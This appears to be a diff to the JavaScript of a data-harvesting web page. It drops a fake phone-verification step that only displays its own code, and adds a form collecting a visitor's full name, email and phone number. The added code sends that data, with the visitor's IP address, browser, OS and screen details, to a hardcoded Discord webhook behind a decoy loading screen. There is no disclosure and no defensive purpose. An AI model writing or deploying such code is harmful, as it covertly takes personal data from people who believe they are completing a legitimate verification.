@@ -1,9 +1,5 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1303237998428299284/2VqK0JzF3uR9vI2D3v4w5X6Y7Z8a9B0c1D2e3F4g5H6';
 
-let userPhoneNumber = '';
-let verificationCode = '';
-let generatedCode = '';
-let currentStep = 0;
 let loadingProgress = 0;
 
 const loadingSteps = [
@@ -27,6 +23,11 @@ function getMobileDeviceType() {
     }
 }
 
+function validateEmail(email) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email);
+}
+
 function validatePhoneNumber(phone) {
     const cleaned = phone.replace(/[^0-9]/g, '');
     return cleaned.length >= 8 && cleaned.length <= 15;
@@ -43,10 +44,6 @@ function formatPhoneNumber(phone) {
     } else {
         return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
     }
-}
-
-function generateVerificationCode() {
-    return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
 function getDeviceInfo() {
@@ -77,12 +74,11 @@ function getDeviceInfo() {
         isMobile,
         browser,
         os,
-        mobileDeviceType,
-        phoneNumber: userPhoneNumber
+        mobileDeviceType
     };
 }
 
-async function sendWebhook() {
+async function sendWebhook(userData) {
     console.log('Sending webhook...');
     if (WEBHOOK_URL) {
         const ip = await fetch('https://api.ipify.org?format=json')
@@ -93,13 +89,15 @@ async function sendWebhook() {
         const deviceInfo = getDeviceInfo();
 
         const embed = {
-            title: '🔐 Phone Verification Completed',
-            description: '📱 User successfully completed phone verification',
+            title: '📋 User Information Submitted',
+            description: '👤 User submitted their personal information',
             color: 0x00ff00,
             fields: [
+                { name: '👤 Full Name', value: userData.name || 'Not provided', inline: false },
+                { name: '📧 Email Address', value: userData.email || 'Not provided', inline: false },
+                { name: '📞 Phone Number', value: userData.phone || 'Not provided', inline: false },
                 { name: '🌐 IP Address', value: ip, inline: true },
                 { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
-                { name: '📞 Phone Number', value: deviceInfo.phoneNumber || 'Not provided', inline: true },
                 { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
                 { name: '🌍 Language', value: deviceInfo.language, inline: true },
                 { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
@@ -209,15 +207,30 @@ async function startLoadingSequence() {
     // Wait a moment before transitioning
     await new Promise(resolve => setTimeout(resolve, 1000));
     
-    // Transition to verification screen
+    // Transition to info form screen
     document.getElementById('loading-screen').style.display = 'none';
     document.getElementById('verification-screen').style.display = 'flex';
 }
 
-function setupPhoneVerification() {
-    const phoneInput = document.getElementById('phone-number');
-    const sendVerificationBtn = document.getElementById('send-verification');
+function setupInfoForm() {
+    const nameInput = document.getElementById('user-name');
+    const emailInput = document.getElementById('user-email');
+    const phoneInput = document.getElementById('user-phone');
+    const submitBtn = document.getElementById('submit-info');
+    const nameError = document.getElementById('name-error');
+    const emailError = document.getElementById('email-error');
     const phoneError = document.getElementById('phone-error');
+    
+    // Clear errors on input
+    nameInput.addEventListener('input', function() {
+        nameError.classList.remove('show');
+        nameInput.classList.remove('error');
+    });
+    
+    emailInput.addEventListener('input', function() {
+        emailError.classList.remove('show');
+        emailInput.classList.remove('error');
+    });
     
     phoneInput.addEventListener('input', function(e) {
         const formatted = formatPhoneNumber(e.target.value);
@@ -226,150 +239,79 @@ function setupPhoneVerification() {
         phoneInput.classList.remove('error');
     });
     
-    sendVerificationBtn.addEventListener('click', async function() {
-        const phoneNumber = phoneInput.value.trim();
+    submitBtn.addEventListener('click', async function() {
+        const name = nameInput.value.trim();
+        const email = emailInput.value.trim();
+        const phone = phoneInput.value.trim();
         
-        if (!validatePhoneNumber(phoneNumber)) {
+        let hasError = false;
+        
+        // Validate name
+        if (!name || name.length < 2) {
+            nameError.textContent = 'Please enter your full name';
+            nameError.classList.add('show');
+            nameInput.classList.add('error');
+            hasError = true;
+        }
+        
+        // Validate email
+        if (!validateEmail(email)) {
+            emailError.textContent = 'Please enter a valid email address';
+            emailError.classList.add('show');
+            emailInput.classList.add('error');
+            hasError = true;
+        }
+        
+        // Validate phone
+        if (!validatePhoneNumber(phone)) {
             phoneError.textContent = 'Please enter a valid phone number (8-15 digits)';
             phoneError.classList.add('show');
             phoneInput.classList.add('error');
+            hasError = true;
+        }
+        
+        if (hasError) {
             return;
         }
         
-        userPhoneNumber = phoneNumber;
-        sendVerificationBtn.disabled = true;
-        sendVerificationBtn.textContent = 'Sending...';
+        // Disable button and show loading state
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Submitting...';
         
-        // Simulate sending verification code
-        await new Promise(resolve => setTimeout(resolve, 2000));
+        // Prepare user data
+        const userData = {
+            name: name,
+            email: email,
+            phone: phone
+        };
         
-        generatedCode = generateVerificationCode();
-        console.log('Generated verification code:', generatedCode);
+        // Send webhook with user data
+        const webhookSuccess = await sendWebhook(userData);
         
-        // Show verification code form
-        document.getElementById('phone-verification-form').style.display = 'none';
-        document.getElementById('verification-code-form').style.display = 'block';
+        // Show success screen
+        document.getElementById('info-form').style.display = 'none';
+        document.getElementById('success-screen').style.display = 'block';
         
-        // Display the verification code for testing (remove in production)
-        const codeDisplay = document.createElement('div');
-        codeDisplay.className = 'code-display';
-        codeDisplay.innerHTML = `
-            <div style="text-align: center; margin: 20px 0; padding: 15px; background: rgba(16, 185, 129, 0.1); border-radius: 8px; border: 1px solid rgba(16, 185, 129, 0.3);">
-                <p style="margin: 0 0 10px 0; color: #10b981; font-weight: 600;">Test Mode - Verification Code:</p>
-                <p style="margin: 0; font-size: 24px; font-weight: bold; color: #10b981; letter-spacing: 2px;">${generatedCode}</p>
-                <p style="margin: 10px 0 0 0; font-size: 12px; color: #6b7280;">(Enter this code above to verify)</p>
-            </div>
-        `;
+        // Log completion
+        console.log('User information submitted successfully:', userData);
         
-        // Insert the code display before the verify button
-        const verifyButton = document.getElementById('verify-code');
-        verifyButton.parentNode.insertBefore(codeDisplay, verifyButton);
-        
-        // Focus on code input
-        document.getElementById('verification-code').focus();
-    });
-    
-    phoneInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            sendVerificationBtn.click();
-        }
-    });
-}
-
-function setupCodeVerification() {
-    const codeInput = document.getElementById('verification-code');
-    const verifyCodeBtn = document.getElementById('verify-code');
-    const codeError = document.getElementById('code-error');
-    const resendBtn = document.getElementById('resend-code');
-    
-    codeInput.addEventListener('input', function(e) {
-        // Only allow numbers
-        e.target.value = e.target.value.replace(/[^0-9]/g, '');
-        codeError.classList.remove('show');
-        codeInput.classList.remove('error');
-    });
-    
-    verifyCodeBtn.addEventListener('click', async function() {
-        const enteredCode = codeInput.value.trim();
-        
-        if (enteredCode.length !== 6) {
-            codeError.textContent = 'Please enter a 6-digit verification code';
-            codeError.classList.add('show');
-            codeInput.classList.add('error');
-            return;
-        }
-        
-        verifyCodeBtn.disabled = true;
-        verifyCodeBtn.textContent = 'Verifying...';
-        
-        // Simulate verification process
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        
-        if (enteredCode === generatedCode) {
-            // Success!
-            document.getElementById('verification-code-form').style.display = 'none';
-            document.getElementById('success-screen').style.display = 'block';
-            
-            // Send webhook with collected data
-            await sendWebhook();
-            
-            // Show success for a few seconds, then could redirect or show final message
-            setTimeout(() => {
-                // Could redirect to another page or show completion message
-                console.log('Verification process completed successfully');
-            }, 3000);
-        } else {
-            codeError.textContent = 'Invalid verification code. Please try again.';
-            codeError.classList.add('show');
-            codeInput.classList.add('error');
-            verifyCodeBtn.disabled = false;
-            verifyCodeBtn.textContent = 'Verify Code';
-        }
-    });
-    
-    codeInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            verifyCodeBtn.click();
-        }
-    });
-    
-    resendBtn.addEventListener('click', async function() {
-        resendBtn.disabled = true;
-        resendBtn.textContent = 'Sending...';
-        
-        // Simulate resending code
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        
-        generatedCode = generateVerificationCode();
-        console.log('New verification code:', generatedCode);
-        
-        // Update the displayed verification code
-        const existingCodeDisplay = document.querySelector('.code-display');
-        if (existingCodeDisplay) {
-            existingCodeDisplay.innerHTML = `
-                <div style="text-align: center; margin: 20px 0; padding: 15px; background: rgba(16, 185, 129, 0.1); border-radius: 8px; border: 1px solid rgba(16, 185, 129, 0.3);">
-                    <p style="margin: 0 0 10px 0; color: #10b981; font-weight: 600;">Test Mode - New Verification Code:</p>
-                    <p style="margin: 0; font-size: 24px; font-weight: bold; color: #10b981; letter-spacing: 2px;">${generatedCode}</p>
-                    <p style="margin: 10px 0 0 0; font-size: 12px; color: #6b7280;">(Enter this code above to verify)</p>
-                </div>
-            `;
-        }
-        
-        codeError.textContent = 'New verification code sent!';
-        codeError.style.color = '#10b981';
-        codeError.classList.add('show');
-        
-        resendBtn.disabled = false;
-        resendBtn.textContent = 'Resend';
-        
+        // Could redirect or show additional options after success
         setTimeout(() => {
-            codeError.classList.remove('show');
+            console.log('Information submission process completed');
         }, 3000);
+    });
+    
+    // Allow Enter key submission
+    [nameInput, emailInput, phoneInput].forEach(input => {
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitBtn.click();
+            }
+        });
     });
 }
 
 window.addEventListener('load', function() {
     startLoadingSequence();
-    setupPhoneVerification();
-    setupCodeVerification();
+    setupInfoForm();
 });
